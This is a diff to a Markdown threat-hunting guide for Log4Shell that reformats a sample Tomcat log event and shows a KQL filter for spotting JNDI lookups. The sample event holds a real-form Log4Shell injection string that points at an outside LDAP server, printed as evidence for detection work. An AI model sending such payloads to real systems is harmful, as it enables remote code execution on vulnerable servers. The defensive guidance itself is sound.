@@ -118,9 +118,7 @@ Examples of searches are provided in Splunk's Splunk Processing Lanagage and Ela
 *Note: Know your data. Some logs may not have nicely formatted fields user-agent, headers, authorization fields, etc. For example, in Apache Tomcat logs, the data we are looking for will be found somewhere in the messages field. Therefore it is best to use a wildcard before and after our string.*
 
 **example event:**
-```
-message:[23/Dec/2021:13:08:44 +0000] catalina-exec-30 - - 192.168.5.100 10.30.21.7 HTTP/1.1 - GET "GET /?s=${jndi:ldap://90.84.178.188:1389/Exploit} HTTP/1.1" 404 1 994 @timestamp:Dec 23, 2021 @ 06:08:59.721 @version:1 @version.keyword:1 agent.ephemeral_id:33d34716-4fa8-3ca1-d430-09dade31b6e77 agent.ephemeral_id.keyword:33d34716-4fa8-3ca1-d430-09dade31b6e77 agent.hostname:home.caffeinatedsheep.com agent.hostname.keyword:home.caffeinatedsheep.com agent.id:07ae318-3d01-4d9f-fab3-ceca53945d13
-```
+```message:[23/Dec/2021:13:08:44 +0000] catalina-exec-30 - - 192.168.5.100 10.30.21.7 HTTP/1.1 - GET "GET /?s=${jndi:ldap://90.84.178.188:1389/Exploit} HTTP/1.1" 404 1 994 @timestamp:Dec 23, 2021 @ 06:08:59.721 @version:1 @version.keyword:1 agent.ephemeral_id:33d34716-4fa8-3ca1-d430-09dade31b6e77 agent.ephemeral_id.keyword:33d34716-4fa8-3ca1-d430-09dade31b6e77 agent.hostname:home.caffeinatedsheep.com agent.hostname.keyword:home.caffeinatedsheep.com agent.id:07ae318-3d01-4d9f-fab3-ceca53945d13```
 
 **appropriate search filter:** <br>
 **KQL:** example:`message : *${jndi\:*`<br>
